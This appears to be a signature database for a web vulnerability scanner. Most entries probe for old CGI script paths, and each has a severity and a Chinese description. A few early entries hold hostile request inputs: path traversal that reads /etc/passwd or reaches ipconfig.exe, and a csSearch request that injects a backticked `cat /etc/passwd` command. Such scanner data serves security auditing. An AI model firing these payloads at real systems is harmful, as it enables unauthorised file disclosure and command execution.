+3301#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSion-p?page=../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Ion-P允许远程文件检索。#d9Fa0j#
+3310#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSindex.pl#d9Fa0j#GET#d9Fa0j#Powered By WebGUI 4.6.8#d9Fa0j#WebGUI 4.6.8 版本根据这份文件，可能存在任意代码不执行漏洞。请参见 http://freshmeat.net/users/rizen/ 。#d9Fa0j#
+3312#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrwcgi60#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Oracle报表服务在检索系统信息时未通过认证。请参见 Oracle 文档 133957.1 -限制访问报表服务的环境和输出。#d9Fa0j#
+3313#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrwcgi60/showenv#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Oracle报表服务在检索系统信息时未通过认证。请参见 Oracle 文档 133957.1 -限制访问报表服务的环境和输出。#d9Fa0j#
+3316#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclassifieds/classifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Mike's Classifieds CGI 存在一个错误，允许在服务器上任意执行命令（未测试），请参见 http://freshmeat.net/projects/myclassifieds/ 。#d9Fa0j#
+3317#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar/index.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Mike's Calendar CGI存在一个错误，允许在服务器上任意执行命令（1.4版本），请参见 http://freshmeat.net/projects/mycalendar/ 。#d9Fa0j#
+3323#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS../../../../../../../../../../WINNT/system32/ipconfig.exe#d9Fa0j#GET#d9Fa0j#IP Configuration#d9Fa0j#Windows版的Alchemy Eye 和 Alchemy Network Monitor 允许攻击者执行任意命令。#d9Fa0j#
+3324#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSNUL/../../../../../../../../../WINNT/system32/ipconfig.exe#d9Fa0j#GET#d9Fa0j#IP Configuration#d9Fa0j#Windows版的Alchemy Eye 和 Alchemy Network Monitor 允许攻击者执行任意命令。#d9Fa0j#
+3325#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSPRN/../../../../../../../../../WINNT/system32/ipconfig.exe#d9Fa0j#GET#d9Fa0j#IP Configuration#d9Fa0j#Windows版的Alchemy Eye 和 Alchemy Network Monitor 允许攻击者执行任意命令。#d9Fa0j#
+3348#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsSearch.cgi?command=savesetup&setup=`cat%20/etc/passwd`#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#csSearch (http://www.cgiscript.net/) 有一个重大缺陷，允许perl被远程执行。请升级版本到2.3或更高。请参考 CVE-2002-0495 。#d9Fa0j#
+3390#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSprintenv.tmp#d9Fa0j#GET#d9Fa0j#DOCUMENT_ROOT#d9Fa0j#Apache 2.0 默认的脚本文件可执行并获取服务器环境变量。所有的默认脚本应移除，并可能引起跨站脚本攻击（XSS）。#d9Fa0j#
+3470#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshowuser.cgi#d9Fa0j#GET#d9Fa0j#Username#d9Fa0j#显示的'whoami'命令的输出，这显示了Web服务器的用户。#d9Fa0j#
+3471#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSman2html#d9Fa0j#GET#d9Fa0j#manual page#d9Fa0j#网关到UNIX手册页。#d9Fa0j#
+3566#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFormMail.pl#d9Fa0j#GET#d9Fa0j#Version 1.92#d9Fa0j#Matt Wright's FormMail 1.92 易受HTTP响应拆分和跨站脚本攻击。#d9Fa0j#
+6776#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/com.livesoftware.jrun.plugins.asp.asp#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+9007#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/com.livesoftware.jrun.plugins.aspx.aspx#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10056#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/admin_login.pl.bak#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10068#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/admin/login.pl.bak#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10109#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/admin/admin_login.pl.bak#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10142#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/login.pl.bak#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10167#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/clients.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10168#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/login.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10169#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/hitview.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10170#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/log-reader.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10172#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/users.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10173#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/bugzilla/userprefs.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10175#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/redirect.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10176#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/status.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10179#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/netauth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10180#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/technote/technote/print.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10181#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/pagelog.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10182#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/guestbook.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10188#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/at-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10189#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/finger.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10190#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/bugzilla/reports.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10205#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/news/news.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10206#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/password.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10207#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/passwords.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10208#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/script.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10209#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/bizdb1-search.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10210#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/classified.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10211#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dbman/db.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10212#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/perlshop.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10213#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/phf.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10214#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/responder.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10215#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/robadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10216#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/spin_client.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10217#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/webplus.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10228#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/count.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10229#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/gbook/gbook.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10231#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/ax-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10232#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10233#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/clients.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10234#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/count.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10235#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/flexform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10236#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/lwgate.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10237#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/tidfinder.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10238#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/whois_raw.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10239#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/update.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10240#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/whois_raw.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10263#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/download.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10264#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/main.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10265#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/stats.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10266#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/download.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10267#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/environ.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10268#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/form.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10269#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/lookwho.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10270#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/maillist.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10271#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mini_logger.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10272#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/pass.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10273#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/store.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10274#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/survey.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10275#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/tigvote.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10276#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/users.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10277#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/shop.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10278#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/shopper.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10279#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/sojourn.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10280#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/whois.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10281#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/apexec.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10296#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/gbook.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10297#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/loadpage.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10298#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mmstdod.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10299#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/pass.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10300#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/php.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10301#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/process_bug.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10302#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/add_ftp.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10303#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dfire.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10304#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/dig.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10305#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/login.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10306#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/logit.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10307#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/search.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10308#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/webbbs.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10309#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/wwwboard/wwwboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10310#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/search.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10311#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/store.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10312#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/submit.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10334#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/news.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10335#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/newsdesk.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10336#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/photoads/cgi-bin/env.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10337#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10338#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/architext_query.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10339#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cachemgr.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10340#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/enter.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10341#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/getdoc.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10342#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/gh.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10343#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/ratlog.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10344#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/sojourn.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10345#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/submit.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10346#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/ultraboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10347#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/test/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10348#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/wwwboard/wwwadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10352#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/8888/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10353#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/AT-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10354#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/AdminHtml/parse_xml.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10355#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/CSNews.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10356#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Poll_It_SSI_v2.0.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10357#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Poll_It_v2.0.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10358#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_privat/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10359#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/access/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10360#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/acctman/info/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10361#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/add-passwd.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10362#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/admin/db/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10363#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ads/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10364#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/adult/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10365#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/amateurs/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10366#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ana-bin/sitehtpass/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10367#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ats/logs/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10368#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10369#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/auth/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10370#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/auth/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10371#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/authorizenet.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10373#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/bizdb1-search.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10374#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10375#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/build.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10376#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cart.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10377#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10378#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10379#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10380#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/male/password/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10381#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10382#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/password/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10383#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbill/secure/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10384#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cfbin/board.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10484#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin2/ampro/info/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10485#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin2/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
